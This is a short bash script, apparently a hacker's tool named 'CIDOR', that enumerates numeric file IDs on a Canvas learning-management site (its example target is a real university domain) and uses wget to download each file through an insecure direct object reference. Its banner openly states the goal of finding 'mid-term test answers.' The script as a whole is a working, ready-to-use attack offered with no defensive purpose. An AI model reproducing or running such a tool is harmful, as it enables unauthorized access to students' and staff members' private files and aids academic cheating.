#!/bin/bash 
#A quick little bashscript by n3on @n3onhacks

#Menu
echo "============================================================================"
echo "============================================================================"
echo "============================================================================"
echo "====           ===   ===   =     =======            ======      ============"
echo "====   ===========   ===   ==     ====     =======    ====   ==        ====="
echo "====   ===========   ===   ====    ===     =======     ==    =======    ===="
echo "====   ===========   ===   ====     ==     =======     ==    ==============="
echo "====   ===========   ===   =====    ===    =======     ==    ==============="
echo "====   ===========   ===   =====    ===    =======     ==    ==============="
echo "====           ===   ===           =====              ===    ==============="
echo "============================================================================"
echo "============================================================================"
echo "================= CIDOR - Canvas IDOR asset DLr v.2.1.0 ===================="
echo "============================ by @n3onhacks ================================="
echo "============================================================================"
echo "============================================================================"
echo "======= build to fuzz a location with historically the best results ========"
echo "============================================================================"
echo "============================================================================"
#Target Selection, Options
echo "SELECT your TARGET (ex: canvas.uchicago.edu):"
read DOMAIN
echo "What number would you like to START FUZZING at? (ex: 300):"
read FIRST
echo "What number would you like to STOP FUZZING at? (ex: 10000):"
read NUMBER
echo "============================================================================"
echo "============================================================================"
echo "=== S ======================================================================"
echo "=== T ======================================================================"
echo "=== A ======================================================================"
echo "=== R ======================================================================"
echo "=== T ======================================================================"
echo "=== I ======================================================================"
echo "=== N ======================================================================"
echo "=== G ======================================================================"
echo "============================================================================"
echo "===== Lets find some mid-term test answers (view POC video on github) ======"
echo "============================================================================"
echo "============================================================================"
echo "============================================================================"

#URL Layout Options
a="https://"
b=$DOMAIN
c="/files/"
d=1
e="/download/"
f="cidor_results.txt"
g=$NUMBER
h=$FIRST
target=${a}${b}${c}${d}${e}


cd temp

#Loop for IDOR by numbers 
for ((d=${h}; d<=${g}; d++))
do
	wget --append-output=${f} ${a}${b}${c}${d}${e}
	echo ${a}${b}${c}${d}${e}
	done

cd ..
./ifiles.sh
